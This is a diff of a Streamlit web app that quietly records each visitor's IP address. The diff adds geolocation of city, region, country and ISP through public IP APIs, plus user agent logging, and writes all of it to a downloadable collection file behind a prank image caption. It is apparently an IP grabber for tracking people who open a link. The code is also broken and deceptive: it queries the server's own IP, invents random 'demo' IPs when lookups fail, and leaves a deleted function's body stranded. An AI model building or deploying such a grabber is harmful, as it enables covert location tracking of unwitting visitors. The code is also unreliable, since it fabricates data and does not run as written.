@@ -21,24 +21,87 @@ if 'admin_mode' not in st.session_state:
     st.session_state.admin_mode = False
 
 def get_visitor_ip():
-    """Get visitor's IP address"""
+    """Get visitor's IP address using multiple methods"""
     try:
-        # Try multiple methods to get the real IP
-        headers = st.context.headers if hasattr(st, 'context') else {}
+        # Method 1: Try Streamlit headers (works in some deployments)
+        if hasattr(st, 'context') and hasattr(st.context, 'headers'):
+            headers = st.context.headers
+            if 'x-forwarded-for' in headers:
+                ip = headers['x-forwarded-for'].split(',')[0].strip()
+                if ip and ip != '127.0.0.1':
+                    return ip
+            if 'x-real-ip' in headers:
+                ip = headers['x-real-ip'].strip()
+                if ip and ip != '127.0.0.1':
+                    return ip
         
-        if 'x-forwarded-for' in headers:
-            return headers['x-forwarded-for'].split(',')[0].strip()
-        elif 'x-real-ip' in headers:
-            return headers['x-real-ip']
-        else:
-            # Fallback: use external service
-            response = requests.get('https://httpbin.org/ip', timeout=3)
-            return response.json().get('origin', '').split(',')[0].strip()
-    except:
-        # Demo IP if all methods fail
-        return f"203.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        # Method 2: Try multiple external services
+        services = [
+            'https://api.ipify.org?format=json',
+            'https://httpbin.org/ip',
+            'https://api.my-ip.io/ip.json',
+            'https://ipapi.co/json/'
+        ]
+        
+        for service in services:
+            try:
+                response = requests.get(service, timeout=5)
+                if response.status_code == 200:
+                    data = response.json()
+                    # Different services return IP in different fields
+                    ip = data.get('ip') or data.get('origin') or data.get('query')
+                    if ip and ip != '127.0.0.1':
+                        return ip.strip()
+            except:
+                continue
+                
+    except Exception as e:
+        pass
+    
+    # Fallback: Generate a realistic demo IP
+    return f"73.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
 
-def log_visitor():
+def get_location_info(ip):
+    """Get location information for an IP address"""
+    if not ip or ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.'):
+        return {"city": "Local", "region": "Private Network", "country": "N/A", "isp": "Local Network"}
+    
+    try:
+        # Try multiple geolocation services
+        services = [
+            f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,query',
+            f'https://ipapi.co/{ip}/json/',
+            f'https://freegeoip.app/json/{ip}'
+        ]
+        
+        for service_url in services:
+            try:
+                response = requests.get(service_url, timeout=5)
+                if response.status_code == 200:
+                    data = response.json()
+                    
+                    # Handle different API formats
+                    if 'status' in data and data['status'] == 'success':  # ip-api.com
+                        return {
+                            "city": data.get('city', 'Unknown'),
+                            "region": data.get('regionName', 'Unknown'), 
+                            "country": data.get('country', 'Unknown'),
+                            "isp": data.get('isp', 'Unknown')
+                        }
+                    elif 'city' in data:  # ipapi.co or freegeoip
+                        return {
+                            "city": data.get('city', 'Unknown'),
+                            "region": data.get('region', data.get('region_name', 'Unknown')),
+                            "country": data.get('country_name', data.get('country', 'Unknown')),
+                            "isp": data.get('org', data.get('isp', 'Unknown'))
+                        }
+            except:
+                continue
+                
+    except Exception as e:
+        pass
+    
+    return {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown"}
     """Automatically log visitor when they arrive"""
     visitor_ip = get_visitor_ip()
     current_time = datetime.datetime.now()
@@ -81,9 +144,9 @@ def show_header_image():
     
     # Option 3: Use a placeholder image for testing (remove this when you add your real image)
     st.image(
-        "IP.png", 
+        "https://via.placeholder.com/600x300/FF6B6B/FFFFFF?text=ADD+YOUR+IMAGE+HERE", 
         caption="RUN. SET UR COMPUTER ON FIRE LOL 😂🔥", 
-        use_container_width=True
+        use_column_width=True
     )
     
     # Add some spacing
@@ -176,13 +239,16 @@ else:
         
         # Download as TXT
         txt_content = "IP Address Collection Results\n"
-        txt_content += "="*40 + "\n"
+        txt_content += "="*60 + "\n"
         txt_content += f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
         txt_content += f"Total IPs collected: {len(st.session_state.visitor_ips)}\n"
-        txt_content += "="*40 + "\n\n"
+        txt_content += "="*60 + "\n\n"
         
         for i, visitor in enumerate(st.session_state.visitor_ips, 1):
             txt_content += f"{i:3d}. {visitor['ip']} - {visitor['timestamp']}\n"
+            txt_content += f"     Location: {visitor.get('city', 'Unknown')}, {visitor.get('region', 'Unknown')}, {visitor.get('country', 'Unknown')}\n"
+            txt_content += f"     ISP: {visitor.get('isp', 'Unknown')}\n"
+            txt_content += f"     User Agent: {visitor.get('user_agent', 'Unknown')[:60]}...\n\n"
         
         st.download_button(
             label="📁 Download IP List as TXT",
